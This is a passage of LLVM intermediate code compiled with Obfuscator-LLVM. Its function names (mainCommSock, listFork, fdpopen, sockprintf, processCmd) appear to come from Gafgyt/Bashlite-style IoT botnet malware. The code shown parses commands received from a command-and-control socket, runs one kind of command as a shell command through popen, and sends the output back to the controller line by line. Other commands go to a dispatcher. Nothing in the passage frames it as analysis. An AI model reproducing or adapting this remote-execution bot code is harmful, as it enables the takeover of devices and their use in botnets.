; <label>:126:                                    ; preds = %121, %121
  store i8 0, i8* %124, align 1
  br label %121

.preheader77:                                     ; preds = %.preheader77.preheader, %128
  %.066 = phi i8* [ %129, %128 ], [ %120, %.preheader77.preheader ]
  %127 = load i8, i8* %.066, align 1
  switch i8 %127, label %128 [
    i8 32, label %130
    i8 0, label %130
  ]

; <label>:128:                                    ; preds = %.preheader77
  %129 = getelementptr inbounds i8, i8* %.066, i64 1
  br label %.preheader77

; <label>:130:                                    ; preds = %.preheader77, %.preheader77
  store i8 0, i8* %.066, align 1
  %131 = getelementptr inbounds i8, i8* %.066, i64 1
  %132 = load i8, i8* %120, align 1
  %133 = icmp eq i8 %132, 0
  br i1 %133, label %._crit_edge101, label %.lr.ph100.preheader

.lr.ph100.preheader:                              ; preds = %130
  br label %.lr.ph100

.lr.ph100:                                        ; preds = %.lr.ph100.preheader, %.lr.ph100
  %134 = phi i8 [ %139, %.lr.ph100 ], [ %132, %.lr.ph100.preheader ]
  %.06398 = phi i8* [ %138, %.lr.ph100 ], [ %120, %.lr.ph100.preheader ]
  %135 = zext i8 %134 to i32
  %136 = call i32 @toupper(i32 %135) #15
  %137 = trunc i32 %136 to i8
  store i8 %137, i8* %.06398, align 1
  %138 = getelementptr inbounds i8, i8* %.06398, i64 1
  %139 = load i8, i8* %138, align 1
  %140 = icmp eq i8 %139, 0
  br i1 %140, label %._crit_edge101.loopexit, label %.lr.ph100

._crit_edge101.loopexit:                          ; preds = %.lr.ph100
  br label %._crit_edge101

._crit_edge101:                                   ; preds = %._crit_edge101.loopexit, %130
  %141 = call i32 @strcmp(i8* %120, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.83, i64 0, i64 0)) #15
  %142 = icmp eq i32 %141, 0
  br i1 %142, label %143, label %158

; <label>:143:                                    ; preds = %._crit_edge101
  %144 = call i32 @listFork()
  %145 = icmp eq i32 %144, 0
  br i1 %145, label %146, label %.backedge

; <label>:146:                                    ; preds = %143
  %147 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %147, i8 0, i64 1024, i32 16, i1 false)
  %148 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %147, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.84, i64 0, i64 0), i8* %131)
  %149 = call i32 @fdpopen(i8* nonnull %147, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i64 0, i64 0))
  %150 = call i8* @fdgets(i8* nonnull %147, i32 1024, i32 %149)
  %151 = icmp eq i8* %150, null
  br i1 %151, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %146
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  call void @trim(i8* nonnull %147)
  %152 = load i32, i32* @mainCommSock, align 4
  %153 = call i32 (i32, i8*, ...) @sockprintf(i32 %152, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.85, i64 0, i64 0), i8* nonnull %147)
  call void @llvm.memset.p0i8.i64(i8* nonnull %147, i8 0, i64 1024, i32 16, i1 false)
  %154 = call i32 @sleep(i32 1) #5
  %155 = call i8* @fdgets(i8* nonnull %147, i32 1024, i32 %149)
  %156 = icmp eq i8* %155, null
  br i1 %156, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %146
  %157 = call i32 @fdpclose(i32 %149)
  call void @exit(i32 0) #17
  unreachable

; <label>:158:                                    ; preds = %._crit_edge101
  %159 = call i8* @strtok(i8* %131, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i64 0, i64 0)) #5
  store i8* %120, i8** %41, align 16
  %160 = icmp eq i8* %159, null
  br i1 %160, label %._crit_edge106.thread, label %.lr.ph105.preheader

.lr.ph105.preheader:                              ; preds = %158
  br label %.lr.ph105

._crit_edge106.thread:                            ; preds = %158
  call void @processCmd(i32 1, i8** nonnull %41)
  br label %.backedge

.lr.ph105:                                        ; preds = %.lr.ph105.preheader, %173
  %.061103 = phi i8* [ %174, %173 ], [ %159, %.lr.ph105.preheader ]
  %.062102 = phi i32 [ %.1, %173 ], [ 1, %.lr.ph105.preheader ]
  %161 = load i8, i8* %.061103, align 1
  %162 = icmp eq i8 %161, 10
  br i1 %162, label %173, label %163

; <label>:163:                                    ; preds = %.lr.ph105
  %164 = call i64 @strlen(i8* nonnull %.061103) #15
  %165 = add i64 %164, 1
  %166 = call noalias i8* @malloc(i64 %165) #5
  %167 = sext i32 %.062102 to i64
  %168 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %167
  store i8* %166, i8** %168, align 8
  %169 = call i64 @strlen(i8* nonnull %.061103) #15
  %170 = add i64 %169, 1
  call void @llvm.memset.p0i8.i64(i8* %166, i8 0, i64 %170, i32 1, i1 false)
  %171 = call i8* @strcpy(i8* %166, i8* nonnull %.061103) #5
  %172 = add nsw i32 %.062102, 1
  br label %173

; <label>:173:                                    ; preds = %.lr.ph105, %163
  %.1 = phi i32 [ %172, %163 ], [ %.062102, %.lr.ph105 ]
  %174 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i64 0, i64 0)) #5
  %175 = icmp eq i8* %174, null
  br i1 %175, label %._crit_edge106, label %.lr.ph105

._crit_edge106:                                   ; preds = %173
  call void @processCmd(i32 %.1, i8** nonnull %41)
  %176 = icmp sgt i32 %.1, 1
  br i1 %176, label %.lr.ph109.preheader, label %.backedge

.lr.ph109.preheader:                              ; preds = %._crit_edge106
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph109

.lr.ph109:                                        ; preds = %.lr.ph109.preheader, %.lr.ph109
  %indvars.iv118 = phi i64 [ %indvars.iv.next119, %.lr.ph109 ], [ 1, %.lr.ph109.preheader ]
  %177 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %indvars.iv118
  %178 = load i8*, i8** %177, align 8
  call void @free(i8* %178) #5
  %indvars.iv.next119 = add nuw nsw i64 %indvars.iv118, 1
  %exitcond = icmp eq i64 %indvars.iv.next119, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph109

._crit_edge110.loopexit:                          ; preds = %.backedge
  br label %._crit_edge110

._crit_edge110:                                   ; preds = %._crit_edge110.loopexit, %46
  %puts = call i32 @puts(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @str, i64 0, i64 0))
  br label %.backedge80.backedge
}

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #3

declare i32 @sleep(i32) local_unnamed_addr #6

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #15

; Function Attrs: nounwind
declare i32 @puts(i8* nocapture readonly) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #12 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #13 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #14 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #15 = { nounwind readonly }
attributes #16 = { nounwind returns_twice }
attributes #17 = { noreturn nounwind }
attributes #18 = { nounwind readnone }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146633309}
!2 = !{i32 -2146631869}
!3 = !{i32 -2146631046}
!4 = distinct !{!4, !5}
!5 = !{!"llvm.loop.unroll.disable"}
!6 = !{i32 -2146630236}
!7 = !{i32 -2146628811}
!8 = !{i32 -2146627949}
!9 = !{i32 -2146627228}
